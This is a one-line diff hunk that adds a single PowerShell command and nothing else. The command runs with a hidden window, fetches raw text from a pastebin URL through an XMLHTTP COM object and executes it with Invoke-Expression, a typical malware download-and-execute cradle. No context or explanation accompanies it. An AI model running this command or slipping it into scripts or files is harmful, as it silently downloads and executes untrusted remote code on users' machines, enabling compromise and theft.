@@ -1,0 +1,1 @@
+powershell -w h -c $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://pastebin.com/raw/bJ82J8nd',$false);$h.send();iex $h.responseText
